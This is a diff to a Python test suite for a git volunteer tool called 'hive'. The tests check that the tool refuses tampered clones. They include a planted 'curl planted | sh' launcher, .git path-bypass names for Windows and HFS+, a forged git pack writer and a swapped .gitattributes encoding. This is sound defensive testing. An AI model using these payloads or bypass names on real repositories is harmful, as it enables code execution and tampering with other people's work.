@@ -4467,6 +4467,26 @@ class TestVolunteerSide(Volunteer):
         sh("git", "remote", "set-url", "origin", "http://local_proxy@127.0.0.1:38219/git/alice/toy", cwd=self.alice.work)
         self.assertEqual(self.setup(), (0, "PROJECT toy\nLOGIN alice\nUPSTREAM upstream/main\n"), self.err)
 
+    def test_setup_says_what_to_do_when_the_clone_holds_an_upstream_that_is_no_remote(self):
+        """« upstream » may be in the clone as something git counts as a remote and the settings do not name: a fetch
+        rule without its address, or a remote written as git once wrote them (.git/remotes, .git/branches). git then
+        refuses to add the project's, at every run. setup says so in a sentence that tells the user what to do,
+        never in a bare word of git's."""
+        said = ("this clone holds something named 'upstream' that is not a remote with an address: git cannot add the project's. Nothing "
+                "was fetched: tell the user to take a fresh clone of the fork")
+        git_dir = self.alice.work / ".git"
+        self.assertEqual(sh("git", "remote", cwd=self.alice.work).stdout.split(), ["origin"])
+        sh("git", "config", "remote.upstream.fetch", "+refs/heads/*:refs/remotes/upstream/*", cwd=self.alice.work)
+        for _ in range(2):
+            self.one_line(self.setup("--project", "toy"), said)
+        sh("git", "config", "--unset", "remote.upstream.fetch", cwd=self.alice.work)
+        (git_dir / "remotes").mkdir(exist_ok=True)
+        (git_dir / "remotes/upstream").write_text(f"URL: {self.w.upstream}\nPull: refs/heads/main:refs/remotes/upstream/main\n")
+        if "upstream" in sh("git", "remote", cwd=self.alice.work).stdout.split():  # (a git that still reads that form)
+            self.one_line(self.setup("--project", "toy"), said)
+        (git_dir / "remotes/upstream").unlink()
+        self.assertEqual(self.setup("--project", "toy")[0], 0, self.err)
+
     def test_setup_fetches_the_project_from_its_own_address_and_branch_and_no_other(self):
         """What setup fetches becomes « upstream », the tip every candidate starts from: its address is the project's
         own, whatever the command line says, and the names it is given are plain names."""
@@ -4555,9 +4575,11 @@ class TestVolunteerSide(Volunteer):
         code, text = self.ready("--tier", "2")
         first = self.fork_branch("hive/ready")
         self.assertEqual((code, self.spoken(text)[0]), (0, f"ASKED {first}"), self.err)
-        self.assertEqual(hive.read_marker(sh("git", "show", "-s", "--format=%B", first, cwd=self.alice.work).stdout),
+        self.assertEqual(hive.read_marker(sh("git", "show", "-s", "--format=%B", first, cwd=self.alice.bare).stdout),
                          {"task": None, "action": "ready", "member": "alice", "model": None, "tier": 2, "deal": None, "prefer": None})
-        self.assertEqual(sh("git", "show", "-s", "--format=%ct", first, cwd=self.alice.work).stdout.strip(),
+        self.assertNotEqual(sh("git", "cat-file", "-e", first, cwd=self.alice.work, check=False).returncode, 0,
+                            "the ask was made in a store of the tool's own and pushed from there: the clone does not hold it")
+        self.assertEqual(sh("git", "show", "-s", "--format=%ct", first, cwd=self.alice.bare).stdout.strip(),
                          str(int(hive.parse_iso(NOW).timestamp())), "an ask is dated by the tool's own clock")
         self.assertEqual(sh("git", "status", "--porcelain", "--branch", cwd=self.alice.work).stdout.split()[1], "claude/work",
                          "asking moves no branch of the clone")
@@ -4928,6 +4950,14 @@ class TestVolunteerSide(Volunteer):
                     self.assertNotIn(planted, text)
         with mock.patch.object(hive, "STATE_BYTES", 100):
             self.assertEqual(self.next(), (0, NOT_READ), "a feed larger than the tool reads")
+        # The state's files are read as files of the state's own folder: a link there is not followed, wherever it leads.
+        feed, elsewhere = self.w.state / "feed.json", self.w.root / "a-feed-elsewhere.json"
+        self.assertTrue(self.next()[1] != NOT_READ)
+        feed.rename(elsewhere)
+        os.symlink(elsewhere, feed)
+        self.assertEqual(self.next(), (0, NOT_READ), "a feed that is a link is not read")
+        feed.unlink()
+        elsewhere.rename(feed)
 
     def test_what_waits_on_the_fork_is_asked_of_the_fork_never_of_a_ref_left_in_the_clone(self):
         """Whether an ask or a candidate waits is asked of the fork itself: the fork says which commit its branch is
@@ -4936,7 +4966,9 @@ class TestVolunteerSide(Volunteer):
         has no such branch, or cannot be reached, nothing waits there, and next says to ask, or to do the task. The
         question leaves no reference in the clone."""
         self.w.run()
-        ask = self.ready("--no-push")[1].split()[1][:-1]
+        ask = self.ready()[1].split()[1]  # an ask the clone holds and the fork does not: pushed, fetched back, then withdrawn
+        sh("git", "fetch", "--quiet", "origin", "hive/ready", cwd=self.alice.work)
+        self.assertEqual(self.ready("--withdraw"), (0, "WITHDRAWN\n"), self.err)
         sh("git", "update-ref", "refs/remotes/origin/hive/ready", ask, cwd=self.alice.work)
         sh("git", "update-ref", "refs/heads/hive/ready", ask, cwd=self.alice.work)
         self.assertEqual(self.next(), (0, ASK), "an ask that was never pushed does not wait")
@@ -5319,8 +5351,11 @@ class TestVolunteerSide(Volunteer):
                         ("ready", "--project", "toy", "--no-push"), ("submit", "--project", "toy", "--task", "toy-0001", "--deal", dealt, "--no-push"),
                         ("start", "--project", "toy", "--task", "toy-0001", "--deal", dealt)):
             with self.subTest(command=command[0]):
-                self.assertEqual(self.run_cli(*command, "--registry", self.registry), (2, ""))
-                self.assertIn("the following arguments are required: --login", self.err)
+                # (a command line the tool cannot read ends as every error does: one line, « hive: … », exit code 2)
+                self.one_line(self.run_cli(*command, "--registry", self.registry), "the following arguments are required: --login", begins=True)
+        self.one_line(self.run_cli("ready", "--registry", self.registry, "--project", "toy", "--login", "alice", "--frobnicate", "x\x1b[31m"),
+                      "unrecognized arguments: --frobnicate", begins=True)
+        self.assertNotIn("\x1b", self.err, "what a line quotes of the command line is made plain")
         self.assertEqual(sh("git", "remote", cwd=self.alice.work).stdout.split(), ["origin"], "setup without a login added nothing to the clone")
         self.assertEqual(self.setup("--login", "alice"), (0, "PROJECT toy\nLOGIN alice\nUPSTREAM upstream/main\n"),
                          "the login given, though the origin spells its owner another way")
@@ -5331,12 +5366,13 @@ class TestVolunteerSide(Volunteer):
         self.assertEqual(self.setup("--project", "toy", "--login", "alice"), (0, "PROJECT toy\nLOGIN alice\nUPSTREAM upstream/main\n"),
                          "in the tests an origin is a folder, which names nobody: the login is the one given all the same")
 
-        def member_of(*command):
-            code, text = self.run_cli(*command, "--registry", self.registry, "--project", "toy", "--login", "ALICE", "--no-push")
+        def member_of(*command, pushed=False):
+            code, text = self.run_cli(*command, "--registry", self.registry, "--project", "toy", "--login", "ALICE", *(() if pushed else ("--no-push",)))
             self.assertEqual(code, 0, self.err)
-            return hive.read_marker(sh("git", "show", "-s", "--format=%B", text.split()[1][:-1], cwd=self.alice.work).stdout)["member"]
-        self.assertEqual([member_of("ready"), member_of("submit", "--upstream-url", str(self.w.upstream), "--task", "toy-0001", "--deal", dealt)],
-                         ["ALICE"] * 2)
+            return hive.read_marker(sh("git", "show", "-s", "--format=%B", text.split()[1].rstrip(":"),
+                                       cwd=self.alice.bare if pushed else self.alice.work).stdout)["member"]
+        self.assertEqual([member_of("ready", pushed=True),  # (an ask is made outside the clone: it is read in the fork)
+                          member_of("submit", "--upstream-url", str(self.w.upstream), "--task", "toy-0001", "--deal", dealt)], ["ALICE"] * 2)
 
     def test_a_folder_of_the_machine_is_an_address_in_the_tests_only(self):
         """The tests' forks are folders of this machine, and a command of the tests takes the folder for the fork's
@@ -5545,7 +5581,8 @@ class TestVolunteerSide(Volunteer):
 
         with never_answers("push"):
             self.one_line(self.ready(), "the push to your fork did not land (git push: timeout after 300 s). Nothing else was pushed: run the "
-                                        "command again; if it fails again, stop and tell the user to check that this machine may push to the fork")
+                                        "command again; if it fails again, stop and tell the user to check that this machine may push to the fork, "
+                                        "and if it may, to take a fresh clone of the fork")
         with never_answers("ls-remote"):
             self.one_line(self.ready("--withdraw"), "git ls-remote: timeout after 60 s")
         with never_answers("commit-tree"):
@@ -5557,17 +5594,17 @@ class TestVolunteerSide(Volunteer):
         candidate: the author's name and address and the committer's, each of the four. A committer the environment
         does not name is the author; an author it does not name is the member, at the address GitHub gives every
         account for that purpose."""
-        def who(commit):
-            return sh("git", "show", "-s", "--format=%an <%ae>|%cn <%ce>", commit, cwd=self.alice.work).stdout.strip()
+        def who(commit, where=None):
+            return sh("git", "show", "-s", "--format=%an <%ae>|%cn <%ce>", commit, cwd=where or self.alice.work).stdout.strip()
 
         def ask(**named):
             with mock.patch.dict(os.environ, named):
                 for name in ("GIT_AUTHOR_NAME", "GIT_AUTHOR_EMAIL", "GIT_COMMITTER_NAME", "GIT_COMMITTER_EMAIL"):
                     if name not in named:
                         del os.environ[name]
-                code, text = self.ready("--no-push")
+                code, text = self.ready()
             self.assertEqual(code, 0, self.err)
-            return who(text.split()[1][:-1])
+            return who(text.split()[1], self.alice.bare)  # (an ask is made outside the clone: the fork holds it)
 
         ann, carl = {"GIT_AUTHOR_NAME": "Ann Author", "GIT_AUTHOR_EMAIL": "ann@example.invalid"}, \
             {"GIT_COMMITTER_NAME": "Carl Committer", "GIT_COMMITTER_EMAIL": "carl@example.invalid"}
@@ -6166,6 +6203,26 @@ class TestVolunteerSide(Volunteer):
             with self.subTest(path=path):
                 with self.assertRaises(hive.NotPlain):
                     hive.place_inside(root, path)
+        # Names that are « .git » on another system: Windows drops dots and spaces at the end of a name, gives it the
+        # short name « git~1 » and reads « : » as a stream of the same file; HFS+ does not count some code points.
+        for name in (b".git.", b".git ", b".GIT. .", b"GIT~1", b"git~1", b".g\xe2\x80\x8cit", b"\xef\xbb\xbf.git", b".git::$INDEX_ALLOCATION",
+                     b".git:stream", b"src\\.git"):
+            with self.subTest(name=name):
+                self.assertTrue(hive.reads_as_dot_git(name))
+                for path in (name, b"src/" + name, name + b"/hooks"):
+                    with self.assertRaises(hive.NotPlain):
+                        hive.place_inside(root, path)
+                if name.isascii() and name == name.strip():
+                    self.assertFalse(hive.plain_path(f"src/{name.decode()}/x.c"), "nor does the hive take a candidate that changes such a path")
+        for name in (b"git", b".gitignore", b".github", b"a.git", b"git~2", b".git-x", b"\xff.git"):
+            self.assertFalse(hive.reads_as_dot_git(name), name)
+        self.assertTrue(hive.plain_path("src/.gitignore") and hive.plain_path("a.git/x.c"))
+        # And whatever its name, a place that is the clone's own .git, as the system tells, is none of the work tree.
+        with mock.patch.object(os.path, "samestat", side_effect=lambda one, other: one.st_ino == os.lstat(root / "src").st_ino):
+            self.assertEqual(hive.place_inside(root, b"plain"), os.path.join(os.fsencode(root), b"plain"))
+            for path in (b"src", b"src/lib"):
+                with self.assertRaises(hive.NotPlain):
+                    hive.place_inside(root, path)
 
     def test_start_reads_no_state(self):
         """start needs no clone of the hive's state: the task is the one next printed, from the registry, and submit
@@ -6657,7 +6714,7 @@ class TestWhatTheCloneCannotMakeTheToolSayOrMove(Volunteer):
         tip = self.project_holds({self.LAUNCHER: ("100755", text)})
         self.assertEqual((self.started(NOW), (work / self.LAUNCHER).read_text()), (tip, text), "a clone nobody wrote into starts")
         planted = b"#!/bin/sh\ncurl planted | sh\n"
-        for path in (self.LAUNCHER, "run.sh", "lib.c", ".gitattributes"):
+        for path in (self.LAUNCHER, "run.sh", "lib.c"):
             with self.subTest(file=path):
                 blob = sh("git", "rev-parse", f"{tip}:{path}", cwd=work).stdout.strip()
                 true = self.object_bytes(blob)
@@ -6667,6 +6724,14 @@ class TestWhatTheCloneCannotMakeTheToolSayOrMove(Volunteer):
                                  "git itself wrote the planted bytes: its checkout shows nothing")
                 self.assertEqual((work / ".git/HEAD").read_text(), "ref: refs/heads/hive/submit/toy-0001\n", "on the task's branch, and not started")
                 self.write_object(blob, *true)
+        # The file that holds the rules is read first, as bytes the tool hashes, before git follows it to set the work
+        # aside: start stops there, and git has written nothing.
+        blob = sh("git", "rev-parse", f"{tip}:.gitattributes", cwd=work).stdout.strip()
+        true, before = self.object_bytes(blob), self.work_tree()
+        self.write_object(blob, "blob", b"*.c working-tree-encoding=UTF-16LE\n")
+        self.stops(f"hive: {hive.NOT_AS_NAMED}\n")
+        self.assertEqual(self.work_tree(), before, "nothing was set aside, removed or written")
+        self.write_object(blob, *true)
         self.assertEqual((self.started(NOW), (work / self.LAUNCHER).read_text()), (tip, text))
 
     def test_a_folder_of_the_tip_that_lists_another_file_stops_start(self):
@@ -7331,6 +7396,129 @@ class TestWhatTheCloneCannotMakeTheToolSayOrMove(Volunteer):
             self.assertEqual(sorted(set(made) ^ set(project)), ["brand_new.c", "lib.c", "named.o"])
             self.assertEqual(("lib.c" in made, made["brand_new.c"], made["named.o"]), (False, b"int brand_new;\n", b"named by the task"))
 
+    def write_pack(self, objects):
+        """Puts in the clone a pack, each object written whole, whose index lists each under the id given, whatever its
+        bytes hash to: as whatever may write into .git could. objects: [(id, kind, bytes)]. Returns its two files."""
+        entries, pack = [], bytearray(b"PACK" + struct.pack(">II", 2, len(objects)))
+        for sha, kind, body in objects:
+            size, head = len(body) >> 4, bytearray([({"commit": 1, "tree": 2, "blob": 3}[kind] << 4) | (len(body) & 15) | (0x80 if len(body) > 15 else 0)])
+            while size:
+                head.append((size & 127) | (0x80 if size > 127 else 0))
+                size >>= 7
+            entry = bytes(head) + zlib.compress(body)
+            entries.append((bytes.fromhex(sha), zlib.crc32(entry), len(pack)))
+            pack += entry
+        pack += hashlib.sha1(pack).digest()
+        entries.sort()
+        fanout = [sum(1 for entry in entries if entry[0][0] <= byte) for byte in range(256)]
+        index = b"\377tOc" + struct.pack(">I", 2) + struct.pack(">256I", *fanout) + b"".join(entry[0] for entry in entries)
+        index += b"".join(struct.pack(">I", entry[1]) for entry in entries) + b"".join(struct.pack(">I", entry[2]) for entry in entries) + bytes(pack[-20:])
+        folder = self.alice.work / ".git/objects/pack"
+        folder.mkdir(parents=True, exist_ok=True)
+        files = [folder / f"pack-{bytes(pack[-20:]).hex()}.pack", folder / f"pack-{bytes(pack[-20:]).hex()}.idx"]
+        files[0].write_bytes(bytes(pack))
+        files[1].write_bytes(index + hashlib.sha1(index).digest())
+        return files
+
+    def test_an_ask_carries_nothing_the_clone_holds(self):
+        """An ask is one commit: no file, no history. A push copies what it sends out of the store it is pushed from,
+        as the bytes lie there, and a clone's store is whatever ran in the clone left. So an ask is made in a store
+        of the tool's own and pushed from there: what the clone holds under the ask's own id, or under the id of the
+        folder that holds nothing, does not go with it and does not stop it. And git never reads that folder from
+        disk (it knows it by heart) while a push would copy it out of a pack as it lies: a clone that holds, under
+        that id, anything else than that folder stops every command."""
+        self.w.run()
+        work, payload = self.alice.work, b"what ran in the sandbox could read this\n" * 40
+        payload_id = hashlib.sha1(b"blob %d\0" % len(payload) + payload).hexdigest()
+        stop = ("hive: STOP: this clone is not a plain clone: it holds, under the id of the folder that holds nothing, an object that is not "
+                "one (in .git/objects), which a push would carry as it lies. Do not commit or push from it, and run no git command in it: "
+                "tell the user\n")
+
+        def fork_holds(sha):
+            return sh("git", "cat-file", "-e", sha, cwd=self.alice.bare, check=False).returncode == 0
+
+        # The one setting of the clone that a push to GitHub may need goes to the tool's own store: the header a checkout
+        # keeps its token in. Nothing else of the clone does.
+        sh("git", "config", "http.https://github.com/.extraheader", "AUTHORIZATION: basic QUJD", cwd=work)
+        real, carried = hive.Clone.git, []
+
+        def watched(clone, *args, **options):
+            if args[0] == "config":
+                carried.append((clone.root != work, args))
+            return real(clone, *args, **options)
+        with mock.patch.object(hive.Clone, "git", watched):
+            self.assertEqual(self.ready("--no-push")[0], 0, self.err)
+        self.assertEqual(carried, [(True, ("config", "--local", "http.https://github.com/.extraheader", "AUTHORIZATION: basic QUJD"))])
+        sh("git", "config", "--unset", "http.https://github.com/.extraheader", cwd=work)
+        # Under the id the ask of this instant will have, the clone holds other bytes: the ask is made and pushed all the same.
+        ask = self.ready("--no-push")[1].split()[1][:-1]
+        self.write_object(ask, "blob", payload)
+        before = set(sh("git", "cat-file", "--batch-all-objects", "--batch-check", cwd=self.alice.bare).stdout.splitlines())
+        self.assertEqual((self.ready()[0], self.fork_branch("hive/ready")), (0, ask), self.err)
+        gained = set(sh("git", "cat-file", "--batch-all-objects", "--batch-check", cwd=self.alice.bare).stdout.splitlines()) - before
+        self.assertEqual(sorted(line.split()[1] for line in gained), ["commit", "tree"], "the ask and the folder that holds nothing: no more")
+        self.assertEqual(sh("git", "cat-file", "-t", ask, cwd=self.alice.bare).stdout.strip(), "commit")
+        (work / ".git/objects" / ask[:2] / ask[2:]).unlink()
+        # A loose file under the empty folder's id that holds other bytes, then one that holds that folder.
+        self.write_object(hive.EMPTY_TREE, "blob", payload)
+        self.assertEqual((self.ready(), self.err), ((3, ""), stop))
+        (work / ".git/objects" / hive.EMPTY_TREE[:2] / hive.EMPTY_TREE[2:]).write_bytes(zlib.compress(b"tree 0\0" + payload))
+        self.assertEqual((self.ready(), self.err), ((3, ""), stop), "a file that begins as that folder does and goes on")
+        self.write_object(hive.EMPTY_TREE, "tree", b"")
+        self.assertEqual(self.ready()[0], 0, self.err)
+        (work / ".git/objects" / hive.EMPTY_TREE[:2] / hive.EMPTY_TREE[2:]).unlink()
+        # A pack that lists, under that id, a file of any bytes: git would push it as it lies, and the fork would keep it.
+        for objects in ([(hive.EMPTY_TREE, "blob", payload)], [(hive.EMPTY_TREE, "tree", b"x" * 20)], [(hive.EMPTY_TREE, "blob", b"")],
+                        [("00" * 20, "blob", b"a"), (hive.EMPTY_TREE, "blob", payload), ("ff" * 20, "blob", b"z")]):
+            with self.subTest(objects=[(sha[:7], kind, len(body)) for sha, kind, body in objects]):
+                files = self.write_pack(objects)
+                for command in (self.ready, lambda: self.next("alice"), self.setup):
+                    self.assertEqual((command(), self.err), ((3, ""), stop))
+                self.assertFalse(fork_holds(payload_id))
+                for file in files:
+                    file.unlink()
+        # Every pack is looked at, not the first alone: one that does not list the id, then one that lists a file under it.
+        files = []
+        for stem, objects in (("pack-00", [("00" * 20, "blob", b"a")]), ("pack-ff", [(hive.EMPTY_TREE, "blob", payload)])):
+            for file in self.write_pack(objects):
+                files.append(file.rename(file.with_name(stem + file.suffix)))
+        self.assertEqual((self.ready(), self.err), ((3, ""), stop))
+        for file in files:
+            file.unlink()
+        # A pack that holds that folder as it is (a clone of a fork that asked before holds one) is a clone like any other;
+        # and an index of a form this tool does not read is not taken on trust.
+        files = self.write_pack([("00" * 20, "blob", b"a"), (hive.EMPTY_TREE, "tree", b"")])
+        self.assertEqual(self.ready()[0], 0, self.err)
+        kept = files[1].read_bytes()
+        files[1].write_bytes(b"\377tOc" + struct.pack(">I", 3) + kept[8:])
+        self.assertEqual((self.ready(), self.err), ((3, ""), stop))
+        files[1].write_bytes(kept[:300])
+        self.assertEqual((self.ready(), self.err), ((3, ""), stop))
+        for file in files:
+            file.unlink()
+        self.assertEqual(self.ready()[0], 0, self.err)
+
+    def test_the_rules_git_follows_for_a_candidate_are_read_first_as_bytes_the_tool_hashes(self):
+        """To make a candidate, git reads the project's commit by itself: its folders, and the .gitattributes files that
+        tell it how to store a file (a line end, an encoding, the text between « $Id » and « $ »). It reads them from
+        the clone's store, without hashing them. A .gitattributes whose bytes were swapped under its id, after start
+        showed the work tree, would have git store the task's files in a way the project never asked for: bytes the
+        work tree never showed, pushed under the member's name, and no later check reads that file, since no
+        candidate changes it. submit reads those objects first, as bytes it hashes itself: it stops, and nothing is
+        made or pushed."""
+        dealt, work = self.w.deal(self.alice, "toy-0001"), self.alice.work
+        self.assertEqual(self.begin("toy-0001", dealt)[0], 0, self.err)
+        self.alice.write("lib.c", LIB + "int the_work;\n")
+        blob = sh("git", "rev-parse", f"{self.start}:.gitattributes", cwd=work).stdout.strip()
+        true, head = self.object_bytes(blob), self.head()
+        self.write_object(blob, "blob", b"*.c working-tree-encoding=UTF-16LE\n")
+        self.assertEqual((self.submit("toy-0001", dealt), self.err), ((3, ""), f"hive: {hive.NOT_AS_NAMED}\n"))
+        self.assertEqual((self.head(), self.fork_branches()), (head, ["refs/heads/main"]), "no commit and no push")
+        self.write_object(blob, *true)
+        code, text = self.submit("toy-0001", dealt)
+        self.assertEqual((code, self.spoken(text)[0]), (0, f"PUSHED {self.fork_branch('hive/submit/toy-0001')}"), self.err)
+        self.assertEqual(sh("git", "show", f"{self.fork_branch('hive/submit/toy-0001')}:lib.c", cwd=self.alice.bare).stdout, LIB + "int the_work;\n")
+
     def test_no_commit_the_branch_holds_is_taken_into_a_candidate_whatever_it_looks_like(self):
         """submit makes its candidate anew at each run: the work, then its marker, on the project's commit. No commit the
         clone's branch holds is taken into it, not even one that looks like the tool's own: the commits a first submit
@@ -7609,8 +7797,8 @@ class TestWhatTheCloneCannotMakeTheToolSayOrMove(Volunteer):
         os.chmod(hook, 0o755)
         self.assertEqual(self.submit("toy-0001", dealt), (2, ""), self.err)
         self.assertEqual(self.err, "hive: the push to your fork did not land (git push failed (1)). Nothing else was pushed: run the command "
-                                   "again; if it fails again, stop and tell the user to check that this machine may push to the fork\n",
-                         "what the fork's side said is not repeated either")
+                                   "again; if it fails again, stop and tell the user to check that this machine may push to the fork, and if it may, to "
+                                   "take a fresh clone of the fork\n", "what the fork's side said is not repeated either")
         self.assertNotIn("PLANTED", self.err)
 
     def test_every_worker_command_runs_with_gits_words_kept_out(self):
